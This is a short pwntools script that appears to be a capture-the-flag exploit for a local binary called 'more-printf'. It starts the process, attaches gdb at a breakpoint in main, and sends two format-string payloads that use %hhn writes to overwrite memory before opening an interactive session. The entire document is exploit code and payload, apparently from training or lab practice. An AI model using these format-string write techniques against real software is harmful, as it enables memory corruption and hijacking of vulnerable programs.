from time import sleep
from pwn import *
p = process("./more-printf")

pid= gdb.attach(p,gdbscript="""b*main+125""")
p.sendline("%c%c%c%101c%hhn%287c%5$hhn")
p.sendline("%101c%5$hhn%287c%5$hhn")

p.interactive()